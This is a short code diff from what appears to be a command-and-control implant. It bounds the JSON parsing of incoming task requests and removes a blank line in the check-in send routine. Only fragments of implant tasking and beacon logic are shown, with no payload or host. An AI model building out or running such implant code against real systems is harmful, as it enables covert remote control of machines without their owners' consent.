@@ -38,7 +38,7 @@ BOOL ImplantSendTasks( DWORD Count ) {
         return TRUE;
     }
 
-    TaskRequestArray = json::parse( buffer );
+    TaskRequestArray = json::parse( buffer, buffer + size );
     for (const json& Task : TaskRequestArray) {
         ImplantQueueTaskRequest( Task );
     }
@@ -55,7 +55,6 @@ BOOL ImplantSendCheckin( json& task, json& response ) {
     packet["task"] = task;
 
     auto serialized = packet.dump();
-
     if (!g_Channel->Interface->Send( g_Channel->Interface->Context, serialized.c_str(), serialized.size(), TRUE )) {
         return FALSE;
     }
